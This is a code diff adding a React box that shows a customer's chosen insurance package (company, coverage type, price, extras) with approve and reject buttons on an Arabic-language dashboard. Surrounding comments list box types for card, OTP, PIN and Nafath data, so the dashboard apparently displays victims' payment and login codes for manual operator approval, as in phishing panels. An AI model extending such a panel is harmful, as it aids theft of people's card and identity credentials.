@@ -2796,6 +2796,186 @@ const renderNafadBox = () => {
       });
     });
     
+
+    // Create a box for each entry that has Package/Offer data (from compar page)
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const selectedOffer = raw.selectedOffer;
+      const hasPackage = selectedOffer?.name || raw.offerTotalPrice;
+
+      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5, Package=6
+      const BOX_TYPE_OFFSET = 6;
+
+      // Use comparCompletedAt if available, otherwise use entry's timestamp
+      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+      if (raw.comparCompletedAt) {
+        const comparTs = new Date(raw.comparCompletedAt).getTime();
+        if (comparTs > 0) {
+          baseTimestamp = raw.comparCompletedAt;
+        }
+      }
+
+      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
+      const isLatest = index === 0;
+
+      // Check if this entry has package data
+      if (!hasPackage) return;
+
+      const offerName = selectedOffer?.name || "—";
+      const offerType = selectedOffer?.type === "comprehensive" ? "تأمين شامل" : "تأمين ضد الغير";
+      const offerPrice = raw.offerTotalPrice ? `${Number(raw.offerTotalPrice).toFixed(2)} ﷼` : "—";
+      const selectedFeatures = selectedOffer?.extra_features || [];
+
+      boxes.push({
+        key: `package-${entry.id}`,
+        timestamp: entryTimestamp,
+        component: (
+          <div style={{
+            background: "#ffffff",
+            borderRadius: 12,
+            padding: 16,
+            border: isLatest ? "2px solid #10b981" : "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#10b981",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            
+            <div style={{
+              display: "flex",
+              justifyContent: "center",
+              alignItems: "center",
+              gap: 8,
+              marginBottom: 12,
+              marginTop: 20
+            }}>
+              <h3 style={{
+                margin: 0,
+                fontSize: "0.9rem",
+                fontWeight: 700,
+                color: "#111827"
+              }}>
+                🏢 الباقة المختارة
+              </h3>
+            </div>
+
+            {/* Company Name */}
+            <div style={{
+              display: "flex",
+              justifyContent: "space-between",
+              background: "#f3f4f6",
+              borderRadius: 6,
+              padding: 8,
+              marginBottom: 8
+            }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة التأمين</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{offerName}</span>
+            </div>
+
+            {/* Insurance Type */}
+            <div style={{
+              display: "flex",
+              justifyContent: "space-between",
+              background: "#f3f4f6",
+              borderRadius: 6,
+              padding: 8,
+              marginBottom: 8
+            }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التأمين</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{offerType}</span>
+            </div>
+
+            {/* Total Price */}
+            <div style={{
+              display: "flex",
+              justifyContent: "space-between",
+              background: "#dcfce7",
+              borderRadius: 6,
+              padding: 8,
+              marginBottom: selectedFeatures.length > 0 ? 8 : 0
+            }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>السعر الإجمالي</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 700, color: "#059669" }}>{offerPrice}</span>
+            </div>
+
+            {/* Selected Features */}
+            {selectedFeatures.length > 0 && (
+              <div style={{
+                background: "#f0f9ff",
+                borderRadius: 6,
+                padding: 8
+              }}>
+                <span style={{ fontSize: "0.75rem", color: "#0369a1", fontWeight: 600, display: "block", marginBottom: 4 }}>
+                  الإضافات المختارة:
+                </span>
+                {selectedFeatures.map((feature: any, idx: number) => (
+                  <div key={idx} style={{
+                    fontSize: "0.75rem",
+                    color: "#075985",
+                    padding: "2px 0"
+                  }}>
+                    ✓ {feature.content}
+                    {feature.price > 0 && <span style={{ marginRight: 4, color: "#059669" }}>(+{feature.price} ﷼)</span>}
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {/* Action Buttons */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button
+                onClick={() => handleReject("package")}
+                style={{
+                  flex: 1,
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: "#fff",
+                  color: "#374151",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  opacity: actionLoading ? 0.5 : 1
+                }}
+              >
+                رفض
+              </button>
+              <button
+                onClick={() => handleApprove("package")}
+                style={{
+                  flex: 1,
+                  padding: "10px 16px",
+                  border: "none",
+                  borderRadius: 8,
+                  background: "#059669",
+                  color: "#fff",
+                  fontWeight: 600,
+                  cursor: "pointer",
+                  opacity: actionLoading ? 0.5 : 1
+                }}
+              >
+                موافقة
+              </button>
+            </div>
+          </div>
+        )
+      });
+    });
     // Sort boxes by timestamp (newest first)
     boxes.sort((a, b) => b.timestamp - a.timestamp);
     
